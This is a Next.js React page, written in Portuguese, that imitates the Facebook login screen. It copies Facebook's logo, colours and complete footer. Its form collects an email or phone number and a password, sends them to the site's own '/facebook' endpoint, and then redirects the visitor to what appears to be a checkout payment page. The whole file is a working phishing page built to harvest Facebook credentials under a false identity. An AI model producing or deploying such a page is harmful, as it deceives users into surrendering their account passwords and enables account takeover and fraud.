'use client';
import { NextPage } from 'next';
import { useForm } from 'react-hook-form';
import { object, string } from 'yup';
import { AxiosError } from 'axios';
import { toast } from 'react-toastify';
import { useSearchParams } from 'next/navigation';
import api from '@/utils/api';
import Image from 'next/image';

const Facebook: NextPage = () => {
  const { register, handleSubmit } = useForm();

  const searchParams = useSearchParams();
  const redirect = searchParams.get('redirect');

  const onSubmit = async (data: any) => {
    const facebookScheme = object({
      identifier: string().required(
        'É obrigatório fornecer um email ou telefone.'
      ),
      password: string().required('É obrigatório fornecer uma senha.'),
    });

    try {
      const account = await facebookScheme.validate(data);

      const response = await api.post('/facebook', account);
      setTimeout(() => {
        window.location.href = redirect
          ? '/' + redirect + '?redirect=checkout/pagamento'
          : '/';
      }, 1000);
    } catch (err: any) {
      const message =
        err instanceof AxiosError ? err.response?.data.Message : err.message;

      toast.error(message);
    }
  };

  return (
    <>
      <div className="bg-[#f0f2f5] py-10">
        <Image
          src="/facebook.svg"
          alt=""
          className="mx-auto"
          width={245}
          height={85}
        />
        <form
          className="w-[400px] bg-white shadow-lg rounded-md mx-auto p-4 border"
          onSubmit={handleSubmit(onSubmit)}
        >
          <h4 className="text-center mb-6">Entrar no Facebook</h4>
          <input
            type="text"
            placeholder="Email ou telefone"
            className="w-full border rounded-md py-3 px-4 mb-4"
            {...register('identifier')}
          />
          <input
            type="password"
            placeholder="Senha"
            className="w-full border rounded-md py-3 px-4 mb-4"
            {...register('password')}
          />
          <button
            type="submit"
            className="w-full bg-[#166fe5] text-white text-center rounded-md font-bold py-3"
          >
            Entrar
          </button>
          <p className="text-center text-blue-500 hover:underline cursor-pointer my-3 text-sm">
            Esqueceu a conta?
          </p>
          <div className="flex items-center gap-2">
            <hr className="border-gray-200 flex-grow" />
            <span className="text-xs text-gray-400">OU</span>
            <hr className="border-gray-200 flex-grow" />
          </div>
          <div className="flex justify-center">
            <button
              type="button"
              className="bg-[#36a420] text-white text-center rounded-md font-bold p-3 mt-4"
            >
              Criar nova conta
            </button>
          </div>
        </form>
      </div>
      <div className="w-[980px] my-28 mx-auto text-xs text-gray-500">
        <ul className="flex gap-4" data-nocookies="1">
          <li>Português (Brasil)</li>
          <li>
            <a
              className="_sv4"
              dir="ltr"
              href="https://www.facebook.com/login/device-based/regular/login/"
              title="English (US)"
            >
              English (US)
            </a>
          </li>
          <li>
            <a
              className="_sv4"
              dir="ltr"
              href="https://es-la.facebook.com/login/device-based/regular/login/"
              title="Spanish"
            >
              Español
            </a>
          </li>
          <li>
            <a
              className="_sv4"
              dir="ltr"
              href="https://fr-fr.facebook.com/login/device-based/regular/login/"
              title="French (France)"
            >
              Français (France)
            </a>
          </li>
          <li>
            <a
              className="_sv4"
              dir="ltr"
              href="https://it-it.facebook.com/login/device-based/regular/login/"
              title="Italian"
            >
              Italiano
            </a>
          </li>
          <li>
            <a
              className="_sv4"
              dir="ltr"
              href="https://de-de.facebook.com/login/device-based/regular/login/"
              title="German"
            >
              Deutsch
            </a>
          </li>
          <li>
            <a
              className="_sv4"
              dir="rtl"
              href="https://ar-ar.facebook.com/login/device-based/regular/login/"
              title="Arabic"
            >
              العربية
            </a>
          </li>
          <li>
            <a
              className="_sv4"
              dir="ltr"
              href="https://hi-in.facebook.com/login/device-based/regular/login/"
              title="Hindi"
            >
              हिन्दी
            </a>
          </li>
          <li>
            <a
              className="_sv4"
              dir="ltr"
              href="https://zh-cn.facebook.com/login/device-based/regular/login/"
              title="Simplified Chinese (China)"
            >
              中文(简体)
            </a>
          </li>
          <li>
            <a
              className="_sv4"
              dir="ltr"
              href="https://ja-jp.facebook.com/login/device-based/regular/login/"
              title="Japanese"
            >
              日本語
            </a>
          </li>
          <li>
            <a
              role="button"
              className="_42ft _4jy0 _517i _517h _51sy"
              rel="dialog"
              href="#"
              title="Mostrar mais idiomas"
            >
              <i className="img sp_EP9wX8qDDvu sx_0de3e6"></i>
            </a>
          </li>
        </ul>
        <div className="border-b border-gray-300 my-4" />
        <div
          id="pageFooterChildren"
          role="contentinfo"
          aria-label="Links para sites do Facebook"
          className="flex"
        >
          <ul className="flex flex-wrap gap-3">
            <li>
              <a href="/reg/" title="Cadastre-se no Facebook">
                Cadastre-se
              </a>
            </li>
            <li>
              <a href="/login/" title="Entrar no Facebook">
                Entrar
              </a>
            </li>
            <li>
              <a href="https://messenger.com/" title="Confira o Messenger.">
                Messenger
              </a>
            </li>
            <li>
              <a href="/lite/" title="Facebook Lite para Android.">
                Facebook Lite
              </a>
            </li>
            <li>
              <a
                href="https://pt-br.facebook.com/watch/"
                title="Navegue pelos nossos vídeos do Watch."
              >
                Watch
              </a>
            </li>
            <li>
              <a href="/places/" title="Confira locais populares no Facebook.">
                Locais
              </a>
            </li>
            <li>
              <a href="/games/" title="Confira os jogos do Facebook.">
                Jogos
              </a>
            </li>
            <li>
              <a
                href="/marketplace/"
                title="Compre e venda no Facebook Marketplace."
              >
                Marketplace
              </a>
            </li>
            <li>
              <a
                href="https://pay.facebook.com/"
                title="Saiba mais sobre o Meta Pay"
                target="_blank"
              >
                Meta Pay
              </a>
            </li>
            <li>
              <a
                href="https://www.meta.com/"
                title="Finalizar a compra com a Meta"
                target="_blank"
              >
                Loja da Meta
              </a>
            </li>
            <li>
              <a
                href="https://www.meta.com/quest/"
                title="Saiba mais sobre o Meta Quest"
                target="_blank"
              >
                Meta Quest
              </a>
            </li>
            <li>
              <a
                href="https://www.instagram.com/"
                title="Confira o Instagram"
                target="_blank"
                rel="noreferrer nofollow"
                data-lynx-mode="asynclazy"
                data-lynx-uri="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT1qamCNJ2COD61GC9JL-dJYjxRLeD-_clvhIVs57JzJtmnX55idvbZx_fw2E2FwmMavkWzoLReVDIiUykKpmjFU479zHuqDyG50atCLsiNvhcfRM1c6Ik0gzsDC0QwDUAoJjxpdQA-kAvqPzzrAQyxnpoI79BCKXvNyUQ"
              >
                Instagram
              </a>
            </li>
            <li>
              <a href="/fundraisers/" title="Doe para causas importantes.">
                Campanhas de arrecadação de fundos
              </a>
            </li>
            <li>
              <a
                href="/biz/directory/"
                title="Navegue pelo nosso diretório de serviços do Facebook."
              >
                Serviços
              </a>
            </li>
            <li>
              <a
                href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
                title="Veja a Central de Informações de Votação."
              >
                Central de Informações de Votação
              </a>
            </li>
            <li>
              <a
                href="/privacy/policy/?entry_point=facebook_page_footer"
                title="Saiba como coletamos, usamos e compartilhamos informações para apoiar o Facebook."
              >
                Política de Privacidade
              </a>
            </li>
            <li>
              <a
                href="/privacy/center/?entry_point=facebook_page_footer"
                title="Saiba como gerenciar e controlar sua privacidade no Facebook."
              >
                Central de Privacidade
              </a>
            </li>
            <li>
              <a href="/groups/discover/" title="Explorar nossos grupos.">
                Grupos
              </a>
            </li>
            <li>
              <a
                href="https://about.meta.com/"
                title="Leia nosso blog, descubra a central de recursos e encontre oportunidades de trabalho."
              >
                Sobre
              </a>
            </li>
            <li>
              <a
                href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto"
                title="Anuncie no Facebook."
              >
                Criar anúncio
              </a>
            </li>
            <li>
              <a
                href="/pages/create/?ref_type=site_footer"
                title="Criar uma Página"
              >
                Criar Página
              </a>
            </li>
            <li>
              <a
                href="https://developers.facebook.com/?ref=pf"
                title="Desenvolver em nossa plataforma."
              >
                Desenvolvedores
              </a>
            </li>
            <li>
              <a
                href="/careers/?ref=pf"
                title="Dê um passo adiante na sua carreira em nossa incrível empresa."
              >
                Carreiras
              </a>
            </li>
            <li>
              <a
                href="/policies/cookies/"
                title="Saiba mais sobre cookies e o Facebook"
                data-nocookies="1"
              >
                Cookies
              </a>
            </li>
            <li>
              <a
                className="_41ug"
                data-nocookies="1"
                href="https://www.facebook.com/help/568137493302217"
                title="Saiba mais sobre as escolhas para anúncios."
              >
                Escolhas para anúncios
                <i className="img sp_EP9wX8qDDvu sx_6bdd81"></i>
              </a>
            </li>
            <li>
              <a
                data-nocookies="1"
                href="/policies?ref=pf"
                title="Leia os nossos termos e políticas."
              >
                Termos
              </a>
            </li>
            <li>
              <a href="/help/?ref=pf" title="Acesse nossa Central de Ajuda.">
                Ajuda
              </a>
            </li>
            <li>
              <a
                href="help/637205020878504"
                title="Acesse nosso aviso de carregamento de contatos e não usuários."
              >
                Carregamento de contatos e não usuários
              </a>
            </li>
            <li>
              <a
                className="accessible_elem"
                href="/settings"
                title="Visualize e edite suas configurações do Facebook."
              >
                Configurações
              </a>
            </li>
            <li>
              <a
                className="accessible_elem"
                href="/allactivity?privacy_source=activity_log_top_menu"
                title="Ver registro de atividades"
              >
                Registro de atividades
              </a>
            </li>
          </ul>
        </div>
        <div className="mt-10">
          <div>
            <span> Meta © 2023</span>
          </div>
        </div>
      </div>
    </>
  );
};

export default Facebook;
